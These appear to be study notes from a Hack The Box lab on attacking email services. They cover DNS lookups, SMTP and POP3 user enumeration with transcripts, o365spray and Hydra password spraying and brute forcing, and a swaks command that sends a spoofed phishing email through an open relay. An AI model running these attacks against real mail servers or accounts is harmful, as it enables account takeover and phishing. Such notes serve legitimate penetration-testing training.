## Enumeration
#### Host - MX Records

```shell
3kjS@htb[/htb]$ host -t MX hackthebox.eu 

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```shell
3kjS@htb[/htb]$ host -t MX microsoft.com 

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```
#### DIG - MX Records

```shell
3kjS@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
```

```shell
3kjS@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
```
#### Host - A Records

```shell
3kjS@htb[/htb]$ host -t A mail1.inlanefreight.htb. 

mail1.inlanefreight.htb has address 10.129.14.128
```

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

```shell
3kjS@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```
## Misconfigurations

Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.
#### VRFY Command

```shell
3kjS@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20... 
Connected to 10.10.110.20. 
Escape character is '^]'. 
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root 

252 2.0.0 root 

VRFY www-data 

252 2.0.0 www-data 

VRFY new-user 

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```
#### EXPN Command

```shell
3kjS@htb[/htb]$ telnet 10.10.110.20 25 

Trying 10.10.110.20... 
Connected to 10.10.110.20. 
Escape character is '^]'. 
220 parrot ESMTP Postfix (Debian/GNU) 

EXPN john 

250 2.1.0 john@inlanefreight.htb 

EXPN support-team 

250 2.0.0 carol@inlanefreight.htb 
250 2.1.5 elisa@inlanefreight.htb
```
#### RCPT TO Command

```shell
3kjS@htb[/htb]$ telnet 10.10.110.20 

25 Trying 10.10.110.20... 
Connected to 10.10.110.20. 
Escape character is '^]'. 
220 parrot ESMTP Postfix (Debian/GNU) 

MAIL FROM:test@htb.com 
it is 
250 2.1.0 test@htb.com... Sender ok 

RCPT TO:julio 
550 5.1.1 julio... User unknown 

RCPT TO:kate 
550 5.1.1 kate... User unknown 

RCPT TO:john 
250 2.1.5 john... Recipient ok
```
#### USER Command

```shell
3kjS@htb[/htb]$ telnet 10.10.110.20 110 
Trying 10.10.110.20... 
Connected to 10.10.110.20. 
Escape character is '^]'. 
+OK POP3 Server ready 

USER julio 
-ERR 

USER john 
+OK
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum).We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

```shell
3kjS@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
## Cloud Enumeration
#### O365 Spray

```shell
3kjS@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
```
![[Screenshot 2026-05-15 at 13.08.35.png]]
Now, we can attempt to identify usernames.
```shell
3kjS@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```
![[Screenshot 2026-05-15 at 13.09.19.png]]
## Password Attacks
#### Hydra - Password Attack

```shell
3kjS@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
#### O365 Spray - Password Spraying

```shell
3kjS@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
## Protocol Specifics Attacks
#### Open Relay

```shell
3kjS@htb[/htb]$ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

```shell
3kjS@htb[/htb]$ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
